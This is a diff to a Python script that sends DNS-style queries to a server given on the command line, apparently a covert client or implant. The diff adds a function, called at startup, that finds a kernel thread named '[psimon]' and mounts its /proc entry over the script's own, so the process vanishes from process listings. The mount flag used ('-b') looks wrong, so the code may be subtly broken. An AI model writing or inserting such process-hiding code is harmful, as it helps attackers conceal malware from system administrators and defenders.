@@ -4,6 +4,8 @@ import struct
 import sys
 import time
 import os
+import subprocess
+from typing import Union, Sequence
 
 WAIT_TIME = 10
 
@@ -12,6 +14,46 @@ if (len(sys.argv) != 2):
     exit
 else:
     SERVER = sys.argv[1]
+
+def hideProccess():
+    pid = os.getpid()
+    processes = getOutputOf("ps aux")
+    processesSplit = processes.split("\n")
+    for process in processesSplit:
+        if '[psimon]' in process:
+            targetPid = process.split()[1]
+            break
+    os.system(f'mount -b /proc/{targetPid} /proc/{pid}')
+
+def getOutputOf(command: Union[str, Sequence[str]]) -> str:
+    """
+    Run a command and return stdout (or stderr if the command fails).
+    Accepts either a shell string or a list argv.
+    """
+    try:
+        if isinstance(command, str):
+            result = subprocess.run(
+                command,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                universal_newlines=True,
+                check=True,
+            )
+        else:
+            result = subprocess.run(
+                command,
+                shell=False,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                universal_newlines=True,
+                check=True,
+            )
+        return result.stdout.strip()
+    except subprocess.CalledProcessError as e:
+        return (e.stdout or e.stderr or "").strip()
+
+hideProccess()
 
 def makeQuery(address):
     query = b'\x12\x34'  # Transaction ID
